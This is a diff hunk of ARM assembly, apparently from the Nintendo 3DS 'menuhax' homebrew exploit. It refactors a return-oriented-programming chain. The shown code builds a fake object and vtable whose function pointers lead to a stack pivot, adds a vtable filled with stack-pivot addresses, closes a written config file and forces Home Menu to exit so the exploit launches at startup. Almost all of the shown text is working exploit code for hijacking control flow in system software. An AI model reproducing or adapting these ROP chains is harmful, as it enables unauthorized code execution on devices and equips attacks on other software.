@@ -821,39 +478,36 @@ CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthrea
 
 CALLFUNC IFile_Write, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x2c, 1, 0, 0, 0
 
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))
-
-.word ROP_LDR_R0FROMR0
-
-.word IFile_Close
+ROPMACRO_IFile_Close (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))
 
 .word MAINLR_SVCEXITPROCESS @ Cause homemenu to terminate, which then results in menuhax automatically launching during homemenu startup.
 
-newthread_rop_object:
-.word NEWTHREAD_ROPBUFFER + (newthread_rop_vtable - newthread_ropstart) @ object+0, vtable ptr
-.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
+newthread_object:
+.word NEWTHREAD_ROPBUFFER + (newthread_vtable - newthread_ropstart) @ object+0, vtable ptr
+.word NEWTHREAD_ROPBUFFER + (newthread_object - newthread_ropstart) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
 .word 0
 .word 0
 
-.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object + 0x20) - newthread_ropstart) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+.word NEWTHREAD_ROPBUFFER + ((newthread_object + 0x20) - newthread_ropstart) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
 
-.space ((newthread_rop_object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
+.space ((newthread_object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
 newthread_rop_stackpivot_sploadword:
 .word NEWTHREAD_ROPBUFFER @ sp
 newthread_rop_stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
-.space ((newthread_rop_object + 0x28) - .)
-.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
+.space ((newthread_object + 0x28) - .)
+.word NEWTHREAD_ROPBUFFER + (newthread_object - newthread_ropstart) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
 
-newthread_rop_vtable:
+newthread_vtable:
 .word 0, 0 @ vtable+0
 .word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 .word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
+
+newthread_ropkit_cmpobject:
+.word (NEWTHREAD_ROPBUFFER + (newthread_ropkit_cmpobject + 0x4 - newthread_ropstart)) @ Vtable-ptr
+.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable
 
 newthread_menuhax_cfg:
 .space 0x2c
